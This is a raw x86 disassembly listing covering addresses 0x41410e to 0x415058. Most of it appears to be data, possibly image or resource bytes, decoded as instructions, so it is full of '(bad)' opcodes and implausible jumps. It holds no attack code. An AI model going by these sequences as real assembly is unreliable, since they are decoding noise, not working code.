  41410e:	(bad)  
  41410f:	(bad)  
  414110:	(bad)  
  414112:	(bad)  
  414114:	hlt    
  414115:	hlt    
  414116:	hlt    
  414117:	(bad)  
  414118:	(bad)  
  414119:	(bad)  
  41411a:	(bad)  
  41411b:	(bad)  
  41411c:	(bad)  
  41411d:	(bad)  
  41411e:	(bad)  
  41411f:	(bad)  
  414120:	sti    
  414121:	cli    
  414122:	cli    
  414123:	(bad)  
  414124:	jmp    0xd2ce:0xc5ffeaea
  41412b:	call   FWORD PTR [ecx+esi*2+0x42aaff6d]
  414132:	cmp    bh,bh
  414134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414135:	sub    ebx,DWORD PTR [esi]
  414137:	call   FWORD PTR [edi-0x5400fff8]
  41413d:	push   ss
  41413e:	add    bh,bh
  414140:	mov    dl,0x16
  414142:	add    bh,bh
  414144:	mov    edx,0xc2ff001a
  414149:	sbb    al,0x0
  41414b:	dec    ebx
  41414d:	push   ds
  41414e:	add    bh,bh
  414150:	rcr    DWORD PTR [edi],cl
  414152:	add    bh,bh
  414154:	fisub  DWORD PTR [edx]
  414156:	add    bh,bh
  414158:	jecxz  0x41417e
  41415a:	add    bh,bh
  41415c:	in     al,dx
  41415d:	pop    ds
  41415e:	add    bh,bh
  414160:	repz aaa 
  414162:	adc    edi,edi
  414164:	(bad)  
  414165:	mov    dl,0xa2
  414167:	(bad)  
  414168:	jmp    ebx
  41416a:	fdiv   st(7),st
  41416c:	(bad)  
  41416d:	fcmovbe st,st(1)
  41416f:	(bad)  
  414170:	(bad)  
  414171:	fcmovbe st,st(0)
  414173:	(bad)  
  414174:	(bad)  
  414175:	fcmovnbe st,st(0)
  414177:	dec    eax
  414179:	mov    ah,0xad
  41417b:	push   DWORD PTR [edx-0x39004e4f]
  414181:	mov    dh,0xff
  414184:	mov    dl,0xb0
  414186:	scas   eax,DWORD PTR es:[edi]
  414187:	call   ecx
  414189:	mov    ecx,0xe2ffffaf
  41418e:	aad    0xff
  414190:	jmp    edx
  414192:	(bad)  
  414193:	(bad)  
  414194:	jmp    ebp
  414196:	fdivr  st,st(7)
  414198:	(bad)  
  414199:	jmp    0xc941417d
  41419e:	mov    al,0xff
  4141a0:	call   0xe840fc6d
  4141a5:	out    dx,al
  4141a6:	lock jmp FWORD PTR [edx-0x69005556]
  4141ad:	xchg   esi,eax
  4141ae:	xchg   esi,eax
  4141af:	scas   eax,DWORD PTR es:[edi]
	...
  4141c8:	scas   eax,DWORD PTR es:[edi]
  4141c9:	mov    ah,0xb4
  4141cb:	sub    dh,BYTE PTR [ecx-0x50bf4c4d]
  4141d1:	mov    al,0xb0
  4141d3:	mov    DWORD PTR [edx-0x37004344],edi
  4141d9:	retf   0xffca
  4141dc:	fcmovu st,st(3)
  4141de:	(bad)  
  4141e0:	repz hlt 
  4141e2:	hlt    
  4141e3:	(bad)  
  4141e4:	(bad)  
  4141e5:	(bad)  
  4141e6:	(bad)  
  4141e7:	call   ebp
  4141e9:	(bad)  
  4141eb:	jmp    FWORD PTR [ebx+ecx*4+0xb91ff8a]
  4141f2:	add    bh,bh
  4141f4:	sahf   
  4141f5:	(bad)  
  4141f7:	jmp    DWORD PTR [ecx+edx*1+0x15acff00]
  4141fe:	add    bh,bh
  414200:	mov    ch,0x17
  414202:	add    bh,bh
  414204:	mov    ebp,0xc4ff0019
  414209:	sbb    al,0x0
  41420b:	dec    esi
  41420d:	push   ds
  41420e:	add    bh,bh
  414210:	(bad)  
  414211:	and    BYTE PTR [eax],al
  414213:	(bad)  
  414214:	fsub   QWORD PTR [ebx]
  414216:	add    bh,bh
  414218:	out    0x24,al
  41421a:	add    bh,bh
  41421c:	out    dx,al
  41421d:	sbb    al,0x0
  41421f:	(bad)  
  414220:	clc    
  414221:	push   esp
  414222:	xor    bh,bh
  414224:	call   ecx
  414226:	(bad)  
  414227:	(bad)  
  414228:	jmp    edi
  41422a:	loop   0x41422b
  41422c:	(bad)  
  41422d:	(bad)  
  41422f:	(bad)  
  414230:	(bad)  
  414231:	(bad)  
  414233:	(bad)  
  414234:	jmp    eax
  414236:	xlat   BYTE PTR ds:[ebx]
  414237:	(bad)  
  414238:	cli    
  414239:	fst    st(4)
  41423b:	inc    edx
  41423d:	mov    dl,0xad
  41423f:	(bad)  
  414240:	mov    esp,0xb9ffb5b8
  414245:	scas   al,BYTE PTR es:[edi]
  414246:	test   eax,0xcdd7edff
  41424b:	(bad)  
  41424c:	jmp    edi
  41424e:	(bad)  
  414250:	jmp    edi
  414252:	fdivp  st(7),st
  414254:	(bad)  
  414255:	jmp    0xee414238
  41425a:	out    0xff,al
  41425c:	call   ebp
  41425e:	sar    edi,0xe9
  414261:	(bad)  
  414262:	mov    eax,0xf5f2eeff
  414267:	(bad)  
  414268:	mov    ecx,0x93ffb9b9
  41426d:	xchg   ebx,eax
  41426e:	xchg   ebx,eax
  41426f:	mov    BYTE PTR [eax],0x0
	...
  414292:	add    BYTE PTR [eax],al
  414294:	scas   eax,DWORD PTR es:[edi]
  414295:	mov    dl,0xb2
  414297:	sbb    eax,0x3db3b3b1
  41429c:	scas   eax,DWORD PTR es:[edi]
  41429d:	mov    bl,0xb2
  41429f:	cwde   
  4142a0:	mov    ecx,0xc6ffbbbb
  4142a5:	mov    edi,0xd7d5ceff
  4142ab:	push   DWORD PTR [ecx-0x79006766]
  4142b1:	add    BYTE PTR [eax],al
  4142b3:	call   FWORD PTR [ebp-0x5900fff6]
  4142b9:	adc    eax,0x15aeff00
  4142be:	add    bh,bh
  4142c0:	mov    bh,0x17
  4142c2:	add    bh,bh
  4142c4:	mov    esi,0xc6ff001b
  4142c9:	sbb    al,0x0
  4142cb:	call   eax
  4142cd:	pop    ds
  4142ce:	add    bh,bh
  4142d0:	fsub   DWORD PTR [edx]
  4142d2:	add    bh,bh
  4142d4:	fisub  WORD PTR [ebx]
  4142d6:	add    bh,bh
  4142d8:	call   0xf1404300
  4142dd:	and    BYTE PTR [eax],al
  4142df:	(bad)  
  4142e0:	cli    
  4142e1:	jb     0x414339
  4142e3:	(bad)  
  4142e4:	jmp    ebx
  4142e6:	fdivp  st(7),st
  4142e8:	jmp    edi
  4142ea:	loope  0x4142eb
  4142ec:	jmp    esp
  4142ee:	(bad)  
  4142f0:	jmp    esp
  4142f2:	fdiv   st(7),st
  4142f4:	jmp    esp
  4142f6:	fdiv   st(7),st
  4142f8:	jmp    esi
  4142fa:	(bad)  
  4142fc:	(bad)  
  4142fd:	call   0xea4142e0
  414302:	(bad)  
  414304:	(bad)  
  414305:	jmp    0xec4142ea
  41430a:	in     al,0xff
  41430c:	(bad)  
  41430d:	in     eax,dx
  41430e:	in     eax,0xff
  414310:	(bad)  
  414311:	out    dx,eax
  414312:	call   0xea314316
  414317:	(bad)  
  414318:	push   ebp
  41431a:	lock (bad) 
  41431c:	jmp    ebx
  41431e:	aam    0xff
  414320:	jmp    0x4142e8
  414322:	mov    ch,0xff
  414324:	repnz cmc 
  414326:	idiv   edi
  414328:	(bad)  
  414329:	(bad)
  41432c:	xchg   edx,eax
  41432d:	xchg   edx,eax
  41432e:	xchg   edx,eax
  41432f:	ficomp DWORD PTR [ebx+0xf9b9b]
	...
  41435d:	add    BYTE PTR [eax],al
  41435f:	add    BYTE PTR [ebx-0x53f3494a],dh
  414365:	mov    al,0xb0
  414367:	and    edi,DWORD PTR [edx+eax*8-0x544d243b]
  41436e:	test   eax,0x986ff
  414373:	jmp    DWORD PTR [ecx-0x5800fff9]
  414379:	adc    eax,0x16afff00
  41437e:	add    bh,bh
  414380:	mov    eax,0xbfff0018
  414385:	sbb    al,BYTE PTR [eax]
  414387:	dec    eax
  414389:	sbb    eax,0x1fd2ff00
  41438e:	add    bh,bh
  414390:	(bad)  [ecx]
  414392:	add    bh,bh
  414394:	loope  0x4143ba
  414396:	add    bh,bh
  414398:	jmp    0x25:0xf3ff0022
  41439f:	(bad)  
  4143a0:	(bad)  
  4143a1:	xchg   ebp,eax
  4143a2:	cmp    bh,0xff
  4143a5:	repnz in eax,dx
  4143a7:	(bad)  
  4143a8:	(bad)  
  4143a9:	jmp    0x414392
  4143ab:	(bad)  
  4143ac:	(bad)  
  4143ad:	jmp    0x414394
  4143af:	(bad)  
  4143b0:	(bad)  
  4143b1:	in     eax,dx
  4143b2:	out    0xff,eax
  4143b4:	(bad)  
  4143b5:	out    dx,al
  4143b6:	jmp    0xeb3243ba
  4143bb:	(bad)  
  4143bc:	push   eax
  4143be:	jmp    0xffff:0xe8f0ffff
  4143c5:	out    dx,eax
  4143c6:	jmp    0xe63043ca
  4143cb:	(bad)  
  4143cc:	(bad)  
  4143cd:	jmp    0x4143af
  4143cf:	(bad)  
  4143d0:	jmp    esi
  4143d2:	fcos   
  4143d4:	(bad)  
  4143d5:	(bad)  
  4143d7:	(bad)  
  4143d8:	(bad)  
  4143d9:	fcmovne st,st(4)
  4143db:	(bad)  
  4143dc:	inc    bh
  4143de:	lods   al,BYTE PTR ds:[esi]
  4143df:	jmp    ebx
  4143e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e2:	(bad)  
  4143e3:	push   edx
  4143e5:	cmc    
  4143e6:	idiv   edi
  4143e8:	rcl    bl,cl
  4143ea:	sar    edi,cl
  4143ec:	lea    ecx,[ebp-0x66660f73]
  4143f2:	cdq    
  4143f3:	xor    al,0x0
	...
  414425:	add    BYTE PTR [eax],al
  414427:	add    bh,al
  414429:	into   
  41442a:	shl    DWORD PTR [ebx-0x49],1
  41442d:	mov    ebx,0x1b8affba
  414432:	adc    eax,0x1a1ff
  414437:	jmp    FWORD PTR [eax-0x4f00ffeb]
  41443d:	push   ss
  41443e:	add    bh,bh
  414440:	mov    ecx,0xc0ff0019
  414445:	sbb    eax,DWORD PTR [eax]
  414447:	dec    ecx
  414449:	push   ds
  41444a:	add    bh,bh
  41444c:	shl    DWORD PTR [edx],cl
  41444e:	add    bh,bh
  414450:	(bad)  [eax+eax*1]
  414453:	jmp    ebx
  414455:	daa    
  414456:	add    bh,bh
  414458:	in     al,dx
  414459:	and    DWORD PTR [eax],eax
  41445b:	(bad)  
  41445c:	clc    
  41445d:	cmp    BYTE PTR [edx],dl
  41445f:	(bad)  
  414460:	(bad)  
  414461:	mov    ebp,0xfdffffae
  414466:	sti    
  414467:	(bad)  
  414468:	(bad)  
  414469:	jmp    0x414450
  41446b:	(bad)  
  41446c:	jmp    esp
  41446e:	(bad)  
  414470:	(bad)  
  414471:	(bad)  
  414473:	(bad)  
  414474:	(bad)  
  414475:	fmul   st,st(0)
  414477:	(bad)  
  414478:	call   edx
  41447a:	mov    esi,0xb8cbfeff
  41447f:	(bad)  
  414480:	std    
  414481:	(bad)  
  414482:	mov    cl,0xff
  414484:	inc    dl
  414486:	test   eax,0xa0bbf7ff
  41448b:	(bad)  
  41448c:	out    dx,al
  41448d:	mov    dh,0x9d
  41448f:	(bad)  
  414490:	jmp    0xea40e44a
  414495:	mov    ebx,0xc1eaffa7
  41449a:	mov    al,0xff
  41449c:	in     eax,dx
  41449d:	les    esi,FWORD PTR [edx-0x4a3d2101]
  4144a3:	push   esi
  4144a5:	clc    
  4144a6:	stc    
  4144a7:	(bad)  
  4144a8:	(bad)  
  4144aa:	loopne 0x4144ab
  4144ac:	xchg   esp,eax
  4144ad:	xchg   esp,eax
  4144ae:	xchg   esp,eax
  4144af:	std    
  4144b0:	lods   al,BYTE PTR ds:[esi]
  4144b1:	lods   al,BYTE PTR ds:[esi]
  4144b2:	lods   al,BYTE PTR ds:[esi]
  4144b3:	sub    al,BYTE PTR [eax]
	...
  4144e5:	add    BYTE PTR [eax],al
  4144e7:	add    al,cl
  4144e9:	int3   
  4144ea:	into   
  4144eb:	cmp    eax,0xffc4c4b8
  4144f0:	(bad)  
  4144f1:	aaa    
  4144f2:	xor    edi,edi
  4144f4:	popf   
  4144f5:	add    BYTE PTR [eax],al
  4144f7:	jmp    FWORD PTR [ecx-0x4d00ffe9]
  4144fd:	sbb    BYTE PTR [eax],al
  4144ff:	(bad)  
  414500:	mov    esi,0xc5ff001b
  414505:	sbb    al,BYTE PTR [eax]
  414507:	call   ecx
  414509:	sbb    al,BYTE PTR [eax]
  41450b:	(bad)  
  41450c:	fst    QWORD PTR [esi]
  41450e:	add    bh,bh
  414510:	jecxz  0x414525
  414512:	add    bh,bh
  414514:	jmp    0xb:0xf1ff0010
  41451b:	push   esi
  41451d:	daa    
  41451e:	add    bh,bh
  414520:	clc    
  414521:	mov    WORD PTR [ebp-0x1],?
  414524:	icebp  
  414525:	scas   eax,DWORD PTR es:[edi]
  414526:	lahf   
  414527:	(bad)  
  414528:	in     al,dx
  414529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41452a:	xchg   ebp,eax
  41452b:	(bad)  
  41452c:	jmp    0x4144d5
  41452e:	xchg   ebx,eax
  41452f:	jmp    esi
  414531:	test   al,0x95
  414533:	(bad)  
  414534:	fsubr  QWORD PTR [ebx-0x48250063]
  41453a:	stos   DWORD PTR es:[edi],eax
  41453b:	(bad)  
  41453c:	faddp  st(1),st
  41453e:	mov    bh,0xff
  414540:	in     al,0xc9
  414542:	mov    ebp,0xbfc8e3ff
  414547:	(bad)  
  414548:	fmul   st(0),st
  41454a:	sar    bh,0xd5
  41454d:	retf   0xffc4
  414550:	(bad)  
  414551:	ror    edi,1
  414553:	(bad)  
  414554:	fcomp  st(1)
  414556:	fdivr  st,st(7)
  414558:	fcmovnu st,st(6)
  41455a:	(bad)  
  41455c:	(bad)  
  41455e:	in     al,0xff
  414560:	fsubrp st(6),st
  414562:	jmp    0xe6272b5d
  414567:	jecxz  0x414547
  414569:	(bad)  
  41456b:	mov    edi,0x62bbbbbb
	...
  4145a8:	ret    0xc6c3
  4145ab:	push   ds
  4145ac:	mov    ecx,0x98ffcac7
  4145b1:	dec    ecx
  4145b2:	inc    ebp
  4145b3:	call   FWORD PTR [ebp-0x55010000]
  4145b9:	add    eax,0x4afff00
  4145be:	add    bh,bh
  4145c0:	mov    bh,0x7
  4145c2:	add    bh,bh
  4145c4:	mov    bh,0xc
  4145c6:	add    bh,bh
  4145c8:	mov    edx,0xbbff011b
  4145cd:	xor    BYTE PTR [edx],bl
  4145cf:	(bad)  
  4145d0:	mov    esi,0xcaff3448
  4145d5:	pop    esi
  4145d6:	dec    ebp
  4145d7:	dec    edx
  4145d9:	jne    0x414643
  4145db:	inc    esp
  4145dd:	nop
  4145de:	test   edi,edi
  4145e0:	retf   0xaab0
  4145e3:	dec    esi
  4145e5:	mov    edi,0xc7cfffbd
  4145ea:	(bad)  
  4145eb:	call   ebx
  4145ed:	into   
  4145ee:	into   
  4145ef:	call   eax
  4145f1:	iret   
  4145f2:	iret   
  4145f3:	dec    edi
  4145f5:	rcl    ebx,1
  4145f7:	dec    edi
  4145f9:	rcl    ebp,cl
  4145fb:	dec    edi
  4145fd:	aad    0xd6
  4145ff:	clc    
  414600:	into   
  414601:	rcl    ebp,cl
  414603:	icebp  
  414604:	into   
  414605:	rcl    esi,cl
  414607:	(bad)  
  414609:	aad    0xd7
  41460b:	retf   0xd9d3
  41460e:	fld    TBYTE PTR [ecx-0x7427282d]
  414614:	rcl    ebp,cl
  414616:	fcomp  DWORD PTR [esi-0x35]
  414619:	int3   
  41461a:	int    0x36
  41461c:	rcl    cl,1
  41461e:	rcr    DWORD PTR [edx+ebx*8],1
  414621:	fcmovu st,st(2)
  414623:	push   ss
  414624:	(bad)  
  414626:	fcom   QWORD PTR [eax]
  414628:	(bad)  
  41462a:	fiadd  WORD PTR [edi]
	...
  414668:	rol    edx,0xc4
  41466b:	adc    dh,BYTE PTR [esi-0x61123d42]
  414671:	jne    0x4146e3
  414673:	inc    DWORD PTR [ebp-0x6400d6d0]
  414679:	pusha  
  41467a:	pop    edx
  41467b:	jmp    FWORD PTR [esi-0x4d008581]
  414681:	xchg   edx,eax
  414682:	nop
  414683:	push   DWORD PTR [eax-0x4a005c5c]
  414689:	mov    eax,0xc8bbffb9
  41468e:	int3   
  41468f:	inc    ecx
  414691:	rcl    ch,cl
  414693:	dec    eax
  414695:	fcomp  st(2)
  414697:	dec    ebx
  414699:	fcmovnu st,st(4)
  41469b:	dec    ebx
  41469d:	fcomp  st(2)
  41469f:	clc    
  4146a0:	retf   
  4146a1:	rcl    ah,cl
  4146a3:	out    0xcb,eax
  4146a5:	iret   
  4146a6:	rcr    cl,1
  4146a8:	retf   
  4146a9:	into   
  4146aa:	iret   
  4146ab:	leave  
  4146ac:	leave  
  4146ad:	int    0xce
  4146af:	stos   DWORD PTR es:[edi],eax
  4146b0:	int    0xcf
  4146b2:	rcl    BYTE PTR [eax+0x75d0cecd],1
  4146b8:	into   
  4146b9:	into   
  4146ba:	into   
  4146bb:	inc    ebp
  4146bc:	leave  
  4146bd:	retf   
  4146be:	retf   0xc828
  4146c1:	enter  0x9c8,0x0
	...
  414725:	add    BYTE PTR [eax],al
  414727:	add    BYTE PTR [eax-0x4dee5459],ch
  41472d:	mov    cl,0xb3
  41472f:	in     eax,0xc0
  414731:	leave  
  414732:	retf   0xbcff
  414735:	int3   
  414736:	iret   
  414737:	inc    esp
  414739:	rcl    dh,cl
  41473b:	inc    ebp
  41473d:	rcl    esp,1
  41473f:	test   bh,0xcf
  414742:	shr    al,cl
  414744:	leave  
  414745:	iret   
  414746:	rcl    ah,1
  414748:	enter  0xcbcb,0xbe
  41474c:	enter  0xcbc9,0xab
  414750:	(bad)  
  414751:	enter  0x92c8,0xc9
  414755:	retf   0x72ca
  414758:	leave  
  414759:	leave  
  41475a:	leave  
  41475b:	pop    eax
  41475c:	retf   
  41475d:	retf   
  41475e:	int3   
  41475f:	aaa    
  414760:	retf   0xcaca
  414763:	sbb    BYTE PTR [eax],al
	...
  4147e5:	add    BYTE PTR [eax],al
  4147e7:	add    BYTE PTR [ebx-0x58fb6065],bl
  4147ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147ee:	test   eax,0xc4c2c466
  4147f3:	nop
  4147f4:	sar    BYTE PTR [esi-0x44448641],0xbd
  4147fb:	pop    edx
  4147fc:	mov    edi,0xc33dbfbd
  414801:	ret    
  414802:	ret    
  414803:	daa    
  414804:	enter  0xc9c8,0xc
	...
  4148ac:	stos   DWORD PTR es:[edi],eax
  4148ad:	stos   DWORD PTR es:[edi],eax
  4148ae:	lods   eax,DWORD PTR ds:[esi]
  4148af:	or     dl,dl
  4148b1:	rcl    edx,1
  4148b3:	(bad)  
  4148b5:	ret    0x3c3
  4148b8:	mov    ebx,0x1bdbb
	...
  414b75:	add    BYTE PTR [eax],al
  414b77:	add    bh,bh
  414b79:	(bad)  
  414b7a:	(bad)  
  414b7b:	(bad)  
  414b7c:	(bad)  
  414b7d:	inc    DWORD PTR [eax]
  414b7f:	add    bh,bh
  414b81:	(bad)  
  414b82:	(bad)  
  414b83:	(bad)  
  414b84:	(bad)  
  414b85:	inc    DWORD PTR [eax]
  414b87:	add    bh,bh
  414b89:	(bad)  
  414b8a:	(bad)  
  414b8b:	(bad)  
  414b8c:	(bad)  
  414b8d:	inc    DWORD PTR [eax]
  414b8f:	add    bh,bh
  414b91:	(bad)  
  414b92:	cld    
  414b93:	add    BYTE PTR [edi],bl
  414b95:	inc    DWORD PTR [eax]
  414b97:	add    bh,bh
  414b99:	push   eax
  414b9b:	add    BYTE PTR [edi],al
  414b9d:	pop    DWORD PTR [eax]
  414b9f:	add    bh,bh
  414ba1:	jmp    eax
  414ba3:	add    BYTE PTR [ecx],al
  414ba5:	add    DWORD PTR [eax],eax
  414ba7:	add    bh,bh
  414ba9:	inc    eax
  414bab:	add    BYTE PTR [eax],al
  414bad:	add    BYTE PTR [eax],al
  414baf:	add    bh,bh
  414bb1:	inc    DWORD PTR [eax+0x0]
  414bb7:	add    bh,bh
  414bb9:	inc    DWORD PTR [eax+0x0]
  414bbf:	add    bh,bh
  414bc1:	inc    DWORD PTR [eax+0x0]
  414bc7:	add    bh,bh
  414bc9:	inc    DWORD PTR [eax+0x0]
  414bcf:	add    al,al
  414bd1:	pop    es
  414bd2:	add    BYTE PTR [eax],0x0
  414bd5:	add    BYTE PTR [eax],al
  414bd7:	add    BYTE PTR [eax+0xc001],al
  414bdd:	add    BYTE PTR [eax],al
  414bdf:	add    BYTE PTR [eax+0x7000],al
  414be5:	sldt   WORD PTR [eax]
  414be8:	add    BYTE PTR [eax],0xc
  414beb:	add    BYTE PTR [eax],al
  414bed:	sldt   WORD PTR [eax]
  414bf0:	add    BYTE PTR [eax],0x0
  414bf3:	add    BYTE PTR [eax],al
  414bf5:	sldt   WORD PTR [eax]
  414bf8:	add    BYTE PTR [eax],0x0
  414bfb:	add    BYTE PTR [eax],al
  414bfd:	sldt   WORD PTR [eax]
  414c00:	add    BYTE PTR [eax],0x0
  414c03:	add    BYTE PTR [eax],al
  414c05:	sldt   WORD PTR [eax]
  414c08:	add    BYTE PTR [eax],0x0
  414c0b:	add    BYTE PTR [eax],al
  414c0d:	sldt   WORD PTR [eax]
  414c10:	add    BYTE PTR [eax],0x0
  414c13:	add    BYTE PTR [eax],al
  414c15:	sldt   WORD PTR [eax]
  414c18:	add    BYTE PTR [eax],0x0
  414c1b:	add    BYTE PTR [eax],al
  414c1d:	sldt   WORD PTR [eax]
  414c20:	add    BYTE PTR [eax],0x0
  414c23:	add    BYTE PTR [eax],al
  414c25:	pop    es
  414c26:	add    BYTE PTR [eax],al
  414c28:	add    BYTE PTR [eax],0x0
  414c2b:	add    BYTE PTR [eax],al
  414c2d:	pop    es
  414c2e:	add    BYTE PTR [eax],al
  414c30:	add    BYTE PTR [eax],0x0
  414c33:	add    BYTE PTR [eax],al
  414c35:	pop    es
  414c36:	add    BYTE PTR [eax],al
  414c38:	add    BYTE PTR [eax],0x0
  414c3b:	add    BYTE PTR [eax],al
  414c3d:	pop    es
  414c3e:	add    BYTE PTR [eax],al
  414c40:	add    BYTE PTR [eax],0x0
  414c43:	add    BYTE PTR [eax],al
  414c45:	pop    es
  414c46:	add    BYTE PTR [eax],al
  414c48:	add    BYTE PTR [eax],0x0
  414c4b:	add    BYTE PTR [eax],al
  414c4d:	pop    es
  414c4e:	add    BYTE PTR [eax],al
  414c50:	add    BYTE PTR [eax],0x0
  414c53:	add    BYTE PTR [eax],al
  414c55:	pop    es
  414c56:	add    BYTE PTR [eax],al
  414c58:	add    BYTE PTR [eax],0x0
  414c5b:	add    BYTE PTR [eax],al
  414c5d:	pop    es
  414c5e:	add    BYTE PTR [eax],al
  414c60:	add    BYTE PTR [eax],0x0
  414c63:	add    BYTE PTR [eax],al
  414c65:	add    eax,DWORD PTR [eax]
  414c67:	add    BYTE PTR [eax+0x0],al
  414c6d:	add    eax,DWORD PTR [eax]
  414c6f:	add    BYTE PTR [eax+0x0],al
  414c75:	add    eax,DWORD PTR [eax]
  414c77:	add    BYTE PTR [eax+0x0],al
  414c7d:	add    eax,DWORD PTR [eax]
  414c7f:	add    BYTE PTR [eax+0x0],al
  414c85:	add    eax,DWORD PTR [eax]
  414c87:	add    al,al
  414c89:	add    BYTE PTR [eax],al
  414c8b:	add    BYTE PTR [eax],al
  414c8d:	add    eax,DWORD PTR [eax]
  414c8f:	add    al,dh
  414c91:	add    BYTE PTR [eax],al
  414c93:	add    BYTE PTR [eax],al
  414c95:	add    eax,DWORD PTR [eax]
  414c97:	add    dh,bh
  414c99:	add    BYTE PTR [eax],al
  414c9b:	add    BYTE PTR [eax],al
  414c9d:	add    DWORD PTR [eax],eax
  414c9f:	add    bh,bh
  414ca1:	rol    BYTE PTR [eax],0x0
  414ca4:	add    BYTE PTR [ecx],al
  414ca6:	add    BYTE PTR [eax],al
  414ca8:	push   eax
  414caa:	add    BYTE PTR [eax],al
  414cac:	add    BYTE PTR [ecx],al
  414cae:	add    BYTE PTR [eax],al
  414cb0:	push   eax
  414cb2:	add    BYTE PTR [eax],al
  414cb4:	add    BYTE PTR [ebx],al
  414cb6:	add    BYTE PTR [eax],al
  414cb8:	push   eax
  414cba:	add    BYTE PTR [eax],al
  414cbc:	add    BYTE PTR [edi],al
  414cbe:	add    BYTE PTR [eax],al
  414cc0:	push   eax
  414cc2:	add    BYTE PTR [eax],al
  414cc4:	pop    ds
  414cc5:	inc    DWORD PTR [eax]
  414cc7:	add    bh,bh
  414cc9:	lock add BYTE PTR [edi],bl
  414ccc:	(bad)  
  414ccd:	inc    DWORD PTR [eax]
  414ccf:	add    bh,bh
  414cd1:	lock ud0 edi,edi
  414cd5:	inc    DWORD PTR [eax]
  414cd7:	add    bh,bh
  414cd9:	clc    
  414cda:	jg     0x414cdb
  414cdc:	(bad)  
  414cdd:	inc    DWORD PTR [eax]
  414cdf:	add    bh,bh
  414ce1:	(bad)  
  414ce2:	(bad)  
  414ce3:	(bad)  
  414ce4:	(bad)  
  414ce5:	inc    DWORD PTR [eax]
  414ce7:	add    bh,bh
  414ce9:	(bad)  
  414cea:	(bad)  
  414ceb:	(bad)  
  414cec:	(bad)  
  414ced:	inc    DWORD PTR [eax]
  414cef:	add    bh,bh
  414cf1:	(bad)  
  414cf2:	(bad)  
  414cf3:	(bad)  
  414cf4:	(bad)  
  414cf5:	inc    DWORD PTR [eax]
  414cf7:	add    BYTE PTR [eax],ch
  414cf9:	add    BYTE PTR [eax],al
  414cfb:	add    BYTE PTR [eax],ah
  414cfd:	add    BYTE PTR [eax],al
  414cff:	add    BYTE PTR [eax+0x0],al
  414d02:	add    BYTE PTR [eax],al
  414d04:	add    DWORD PTR [eax],eax
  414d06:	and    BYTE PTR [eax],al
  414d08:	add    BYTE PTR [eax],al
  414d0a:	add    BYTE PTR [eax],al
  414d0c:	adc    BYTE PTR [eax],0x0
	...
  414e5b:	add    BYTE PTR [eax-0x47fb4f50],dh
  414e61:	mov    eax,0xaaaa4ab8
  414e66:	stos   BYTE PTR es:[edi],al
  414e67:	xchg   BYTE PTR [esi-0x4669494a],dh
  414e6d:	mov    ecx,0xa1a195b9
  414e72:	mov    eax,ds:0x81818195
  414e77:	xchg   DWORD PTR [edi+0x77],esi
  414e7a:	ja     0x414eca
  414e7c:	jbe    0x414ef4
  414e7e:	jbe    0x414e86
	...
  414ed8:	sahf   
  414ed9:	sahf   
  414eda:	sahf   
  414edb:	fs mov edi,0xd5d5d9c7
  414ee2:	aad    0xff
  414ee4:	fstp   st(5)
  414ee6:	(bad)  
  414ee8:	loop   0x414ecc
  414eea:	loop   0x414eeb
  414eec:	fcmovu st,st(2)
  414eee:	(bad)  
  414ef0:	(bad)  
  414ef1:	(bad)  
  414ef2:	(bad)  
  414ef3:	(bad)  
  414ef4:	(bad)  
  414ef6:	fdiv   st(7),st
  414ef8:	enter  0xc8c8,0xff
  414efc:	mov    ds:0x97bda2a2,al
  414f01:	xchg   edi,eax
  414f02:	xchg   edi,eax
  414f03:	pop    edi
	...
  414f10:	add    BYTE PTR [eax],al
  414f12:	add    BYTE PTR [edx],al
  414f14:	add    BYTE PTR [eax],al
  414f16:	add    BYTE PTR [ecx],al
	...
  414f50:	xchg   edi,eax
  414f51:	xchg   edi,eax
  414f52:	xchg   edi,eax
  414f53:	or     ebp,DWORD PTR [edi-0x26185051]
  414f59:	(bad)  
  414f5b:	(bad)  
  414f5c:	(bad)  
  414f5e:	fcos   
  414f60:	(bad)  
  414f62:	fdiv   st(7),st
  414f64:	loopne 0x414f46
  414f66:	loopne 0x414f67
  414f68:	(bad)  
  414f6a:	(bad)  
  414f6c:	rcl    al,1
  414f6e:	sar    bh,1
  414f70:	iret   
  414f71:	iret   
  414f72:	iret   
  414f73:	(bad)  
  414f74:	jmp    0xcdcd:0xcdffeaea
  414f7b:	dec    esi
  414f7d:	into   
  414f7e:	into   
  414f7f:	call   eax
  414f81:	rcl    al,1
  414f83:	jmp    DWORD PTR [eax+0x1daca0a0]
  414f89:	sbb    eax,0x361d
  414f8e:	add    BYTE PTR [ecx],cl
  414f90:	add    BYTE PTR [eax],al
  414f92:	add    BYTE PTR [ecx],ch
  414f94:	add    BYTE PTR [eax],al
  414f96:	add    BYTE PTR [esi],dl
  414f98:	add    BYTE PTR [eax],al
  414f9a:	add    BYTE PTR [eax+eax*1],al
	...
  414fcd:	add    BYTE PTR [eax],al
  414fcf:	add    BYTE PTR [ebx-0x2c184c4d],dh
  414fd5:	rcl    ebx,cl
  414fd7:	inc    edi
  414fd9:	mov    edi,0xc8c8c8ff
  414fdf:	call   esp
  414fe1:	aam    0xd4
  414fe3:	(bad)  
  414fe4:	(bad)  
  414fe6:	(bad)  
  414fe8:	loope  0x414fcb
  414fea:	loope  0x414feb
  414fec:	rcl    dl,cl
  414fee:	sar    bh,cl
  414ff0:	iret   
  414ff1:	iret   
  414ff2:	iret   
  414ff3:	(bad)  
  414ff4:	fcmovu st,st(2)
  414ff6:	(bad)  
  414ff8:	mov    ebp,0xc3ffbdbd
  414ffd:	ret    
  414ffe:	ret    
  414fff:	push   DWORD PTR [esi-0x3a00494a]
  415005:	(bad)
  415008:	mov    al,0xb0
  41500a:	mov    al,0xff
  41500c:	add    BYTE PTR [eax],al
  41500e:	add    BYTE PTR [eax+eax*1+0x0],dl
  415012:	add    BYTE PTR [edx],bh
  415014:	add    BYTE PTR [eax],al
  415016:	add    BYTE PTR [esi],ch
  415018:	add    BYTE PTR [eax],al
  41501a:	add    BYTE PTR [edi],dl
  41501c:	add    BYTE PTR [eax],al
  41501e:	add    BYTE PTR [edx],cl
	...
  41504c:	stos   BYTE PTR es:[edi],al
  41504d:	stos   BYTE PTR es:[edi],al
  41504e:	stos   BYTE PTR es:[edi],al
  41504f:	cs mov ebp,0xb7ffbdbd
  415055:	mov    bh,0xb7
  415057:	(bad)  
  415058:	mov    esi,0xc6ffbebe
